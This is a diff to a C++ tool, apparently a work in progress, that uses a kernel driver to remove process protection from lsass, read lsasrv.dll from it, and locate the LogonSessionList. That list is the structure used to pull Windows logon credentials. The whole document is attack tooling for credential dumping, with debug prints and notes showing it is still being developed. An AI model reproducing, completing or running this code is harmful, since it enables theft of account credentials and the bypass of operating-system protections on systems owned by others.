@@ -64,8 +64,8 @@ namespace driver {
 		SIZE_T sReturn_size;
 		PVOID pBase;
 		PVOID pEnd;
-		ULONG_PTR offset; //FIND ITS IN DRIVER BUT CANT PASS TO USERMODE?
-		//PVOID offset;
+		//ULONG_PTR offset; //FIND ITS IN DRIVER BUT CANT PASS TO USERMODE?
+		PVOID pattern;
 	};
 
 	bool attachToProcess(const DWORD PID, HANDLE hDriver) {
@@ -97,7 +97,7 @@ namespace driver {
 		return DeviceIoControl(hDriver, codes::unprotect, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
 	}
 
-	ULONG findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {		
+	PVOID findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {		
 		Request req;
 		req.pBase = pBase;
 		req.pEnd = pEnd;
@@ -105,13 +105,13 @@ namespace driver {
 		printf("Base: 0x%p\n", req.pBase);
 		printf("End : 0x%p\n", req.pEnd);
 
-		req.offset = NULL;
+		req.pattern = NULL;
 		DeviceIoControl(hDriver, codes::lssl, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
-		if (req.offset == NULL) {
+		if (req.pattern == NULL) {
 			printf("DeviceIoControl error getting pLssl,,.,.\n");
 		}
-		printf("Pattern @ 0x%p", req.offset);
-		return req.offset;
+		printf("Pattern @ 0x%p\n", req.pattern);
+		return req.pattern;
 	}
 }
 
@@ -371,18 +371,18 @@ int main(int argc, wchar_t* argv[]) {
 	if (!ReadProcessMemory(hTarget, pLsasrv, &hLsasrv, sizeof(HMODULE), &sLsasrv)) {
 		printf("Error reading lsasrv.dll from lsass...\n");
 	}
-	ULONG_PTR uLslOffset = 0;
+	PVOID pLsl = NULL;
 	PVOID pEnd = (BYTE*)pLsasrv + (SIZE_T)uSize;
 
-	uLslOffset = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
+	pLsl = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
 
-	if (uLslOffset == 0) {
+	if (pLsl == 0) {
 		printf("Error finding LSL offset...\n");
 	}
 
-	PVOID pLogonSessionList = (PVOID)((ULONG_PTR)pLsasrv + uLslOffset); //matches earlier calculation..hopefully..
+	//PVOID pLogonSessionList = (PVOID)((ULONG_PTR)pLsasrv + pLsl); //matches earlier calculation..hopefully..
 
-	printf("Logon Session List: 0x%p...\n", pLogonSessionList);
+	printf("Logon Session List: 0x%p...\n", pLsl);
 
 	//now confirm in windbg?
 
